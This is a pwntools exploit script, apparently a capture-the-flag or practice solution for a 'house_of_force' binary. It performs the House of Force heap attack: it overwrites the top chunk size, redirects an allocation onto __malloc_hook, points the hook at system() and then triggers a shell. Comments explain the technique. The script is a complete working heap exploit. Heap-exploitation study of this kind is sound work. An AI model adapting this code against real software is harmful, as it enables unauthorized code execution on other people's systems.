from pwn import *

elf = context.binary = ELF('./house_of_force', checksec = False)
libc = ELF(elf.runpath + b'/libc.so.6')

context.log_level = 'info'

gs = '''
c
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


io = start()


# Grab Puts
io.recvuntil(b'puts() @ ')
puts = int(io.recvline(), 16)
log.success(f'Puts Leaked: {hex(puts)}')


# Grab Heap
io.recvuntil(b'heap @ ')
heap = int(io.recvline(), 16)
log.success(f'Heap Leaked: {hex(heap)}')
io.timeout = 0.1


# Grab Base Address (bcs of ASLR)
libc.address = puts - libc.sym['puts']
log.success(f'Base address = {hex(libc.address)}')



## =======================================================================================================

def malloc(size, data):
    io.send('1')
    io.sendafter(b"size: ", f"{size}")
    io.sendafter(b"data: ", data)
    io.recvuntil("> ")


malloc(24, b'Y'*24 + p64(0xffffffffffffffff))


# Difference between the start address of the top chunk and the malloc hook


# 48 bytes after the heap addr
# malloc returns a pointer 16 bytes after the target addr so we need to minus the 16 bytes to get the actual 'target' addr

distance = (libc.sym['__malloc_hook'] - 0x10) - (heap + 0x30)

malloc(distance, 'Y')

malloc(24, p64(libc.sym['system']))
cmd = next(libc.search('/bin/sh'))

malloc(cmd, "")



io.interactive()



# 🔧 What is __malloc_hook?

# __malloc_hook is a function pointer inside libc that's called by malloc internally if it's set to a non-NULL value.

# So if you overwrite __malloc_hook with the address of system(), and then call malloc("/bin/sh"), what you're actually doing is:

# malloc("/bin/sh") --> __malloc_hook("/bin/sh") --> system("/bin/sh")

# Boom — shell.